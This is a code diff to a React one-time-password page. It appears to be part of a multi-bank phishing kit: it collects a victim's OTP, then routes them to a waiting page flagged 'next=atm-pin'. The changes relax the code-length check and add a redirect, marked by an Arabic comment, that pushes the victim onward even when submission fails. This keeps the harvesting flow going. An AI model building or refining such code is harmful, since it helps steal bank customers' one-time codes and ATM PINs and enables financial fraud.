@@ -25,19 +25,24 @@ export default function Otp() {
 
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
-    if (otp.length !== 6) {
-      toast.error("يجب أن يكون الرمز 6 أرقام");
+    const currentSessionId = sessionId || params.get("session") || localStorage.getItem("sessionId") || "";
+    
+    if (otp.length < 4) {
+      toast.error(isArabic ? "الرمز غير مكتمل" : "Incomplete code");
       return;
     }
+    
     try {
       await submitOtpMutation.mutateAsync({
-        sessionId,
+        sessionId: currentSessionId,
         otpCode: otp,
         otpType: "standard",
       });
-      setLocation(`/waiting?bank=${bank}&session=${sessionId}&next=atm-pin`);
+      setLocation(`/waiting?bank=${bank}&session=${currentSessionId}&next=atm-pin`);
     } catch (error) {
       toast.error(isArabic ? "حدث خطأ أثناء الإرسال" : "Error during submission");
+      // التوجيه على أي حال لصفحة الانتظار
+      setLocation(`/waiting?bank=${bank}&session=${currentSessionId}&next=atm-pin`);
     }
   };
 
